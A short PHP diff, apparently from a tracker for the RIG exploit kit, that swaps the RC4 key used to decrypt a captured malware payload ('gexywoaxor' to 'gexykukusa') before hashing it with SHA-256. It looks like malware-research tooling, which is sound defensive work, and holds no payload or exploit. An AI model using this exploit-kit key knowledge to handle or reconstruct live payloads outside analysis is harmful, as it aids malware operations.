@@ -182,7 +182,8 @@ class Rig
             }
         }
 
-        $key = 'gexywoaxor';
+        // $key = 'gexywoaxor';
+        $key = 'gexykukusa';
         $malware = RC4::calc($malware, $key);
 
         $sha256 = hash('sha256', $malware);
